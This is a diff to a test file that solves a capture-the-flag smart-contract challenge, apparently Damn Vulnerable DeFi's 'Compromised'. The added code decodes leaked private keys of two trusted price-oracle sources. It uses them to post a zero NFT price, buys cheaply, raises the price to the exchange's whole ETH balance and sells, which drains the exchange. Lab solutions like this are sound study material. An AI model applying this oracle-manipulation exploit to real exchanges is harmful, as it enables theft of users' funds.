@@ -71,13 +71,26 @@ describe('Compromised challenge', function () {
         let priKey2ToBase64 = Buffer.from(priKey2.split(' ').join(''),'hex').toString('utf-8');
         let priKey2ToHex = Buffer.from(priKey2ToBase64,'base64').toString('utf-8');
 
-        let TrustedSource1 = new ethers.Wallet(priKey1ToHex);
-        let TrustedSource2 = new ethers.Wallet(priKey2ToHex);
+        let TrustedSource1 = new ethers.Wallet(priKey1ToHex, ethers.provider);
+        let TrustedSource2 = new ethers.Wallet(priKey2ToHex, ethers.provider);
+        console.log("TrustedSource1: ", TrustedSource1.address);
+        console.log("TrustedSource2: ", TrustedSource2.address);
+        
+        await this.oracle.connect(TrustedSource1).postPrice("DVNFT", 0);
+        await this.oracle.connect(TrustedSource2).postPrice("DVNFT", 0);
 
-        const lowestPrice = ethers.utils.parseEther("0.1")
-        this.oracle.connect(TrustedSource1).postPrice("DVNFT", lowestPrice);
+        await this.exchange.connect(attacker).buyOne({value: 1});
+        //console.log(await this.nftToken.balanceOf(attacker.address));
+    
+        await this.oracle.connect(TrustedSource1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE)
+        await this.oracle.connect(TrustedSource2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE)
 
-        console.log(await (await ethers.provider.getBalance(this.exchange.address)).toString());
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        await this.exchange.connect(attacker).sellOne(0);
+
+        await this.oracle.connect(TrustedSource1).postPrice("DVNFT", INITIAL_NFT_PRICE)
+        await this.oracle.connect(TrustedSource2).postPrice("DVNFT", INITIAL_NFT_PRICE)
+
     });
 
     after(async function () {
